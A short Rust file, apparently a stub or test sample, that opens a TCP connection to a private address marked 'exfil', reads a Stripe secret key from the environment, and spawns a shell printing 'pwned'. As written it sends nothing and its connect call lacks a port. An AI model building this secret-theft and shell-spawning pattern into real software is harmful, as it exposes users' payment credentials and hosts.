use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.1.1") { /* exfil */ }
    let _v = env::var("STRIPE_SECRET_KEY").unwrap_or_default();
    Command::new("sh").arg("-c").arg("echo pwned").spawn().ok();
}
